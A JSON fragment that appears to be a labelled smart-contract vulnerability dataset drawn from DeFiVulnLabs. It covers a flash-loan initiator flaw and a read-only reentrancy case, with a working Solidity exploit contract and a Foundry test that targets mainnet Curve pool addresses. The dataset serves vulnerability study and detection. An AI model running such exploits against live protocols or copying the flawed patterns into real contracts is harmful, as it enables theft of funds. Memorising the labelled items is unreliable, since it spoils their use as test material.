external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "flash_loan_attack",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Missing flash loan initiator check",
    "description": "Missing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.",
    "scenario": "",
    "fix_description": "Check the initiator of the flash loan and revert if the initiator is not authorized.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Flashloan-flaw.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_readonlyreentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ReadOnlyReentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n/*\nName: Read-Only Reentrancy Vulnerability\n\nDescription:\nThe Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.\n\nMitigation:\nAvoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }\n\nREF\nhttps://twitter.com/1nf0s3cpt/status/1590622114834706432\nhttps://chainsecurity.com/heartbreaks-curve-lp-oracles/\nhttps://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334\nhttps://www.youtube.com/watch?v=0fgGTRlsDxI\n\n*/\n\ninterface ICurve {\n    function get_virtual_price() external view returns (uint);\n\n    function add_liquidity(\n        uint[2] calldata amounts,\n        uint min_mint_amount\n    ) external payable returns (uint);\n\n    function remove_liquidity(\n        uint lp,\n        uint[2] calldata min_amounts\n    ) external returns (uint[2] memory);\n\n    function remove_liquidity_one_coin(\n        uint lp,\n        int128 i,\n        uint min_amount\n    ) external returns (uint);\n}\n\naddress constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;\naddress constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token\n\n// VulnContract\n// users stake LP_TOKEN\n// getReward rewards the users based on the current price of the pool LP token\ncontract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\ncontract ExploitContract {\n    ICurve private constant pool = ICurve(STETH_POOL);\n    IERC20 public constant lpToken = IERC20(LP_TOKEN);\n    VulnContract private immutable target;\n\n    constructor(address _target) {\n        target = VulnContract(_target);\n    }\n\n    // Stake LP into VulnContract\n    function stakeTokens() external payable {\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        console.log(\n            \"LP token price after staking into VulnContract\",\n            pool.get_virtual_price()\n        );\n\n        lpToken.approve(address(target), lp);\n        target.stake(lp);\n    }\n\n    // Perform Read-Only Reentrancy\n    function performReadOnlyReentrnacy() external payable {\n        // Add liquidity to Curve\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        // Log get_virtual_price\n        console.log(\n            \"LP token price before remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Remove liquidity from Curve\n        // remove_liquidity() invokes the recieve() callback\n        uint[2] memory min_amounts = [uint(0), uint(0)];\n        pool.remove_liquidity(lp, min_amounts);\n        // Log get_virtual_price\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price after remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is not invoked: \", reward);\n    }\n\n    receive() external payable {\n        // receive() is called when the remove_liquidity is called\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price during remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is invoked: \", reward);\n    }\n}\n\ncontract ExploitTest is Test {\n    ExploitContract public hack;\n    VulnContract public target;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n        target = new VulnContract(); // deploy the vulnerable contract\n        hack = new ExploitContract(address(target)); // deploy attacker contract\n    }\n\n    function testPwn() public {\n        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract\n        hack.performReadOnlyReentrnacy{value: 100000 ether}();\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Read-Only Reentrancy Vulnerability",
    "description": "The Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.",
    "scenario": "",
    "fix_description": "Avoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }",
    "references": [
      "https://twitter.com/1nf0s3cpt/status/1590622114834706432"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ReadOnlyReentrancy.sol",
    "framework": "foundry"
  }
]